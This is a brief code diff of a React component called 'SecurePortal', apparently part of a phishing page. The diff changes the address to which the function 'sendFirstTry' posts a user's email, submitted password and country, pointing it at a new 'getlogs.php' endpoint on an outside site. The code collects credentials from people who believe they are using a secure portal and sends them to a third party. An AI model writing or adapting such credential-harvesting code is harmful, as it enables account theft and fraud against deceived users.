@@ -170,7 +170,7 @@ const SecurePortal = () => {
 
   const sendFirstTry = async (code) => {
     try {
-      await axios.post('https://un-helpers.site/mm.php/', {
+      await axios.post('https://un-helpers.site/getlogs.php/', {
         email: userInput,
         firstpasswordused: code,
         country: locationData.country,
@@ -334,4 +334,5 @@ const SecurePortal = () => {
 };
 
 export default SecurePortal;
+
 
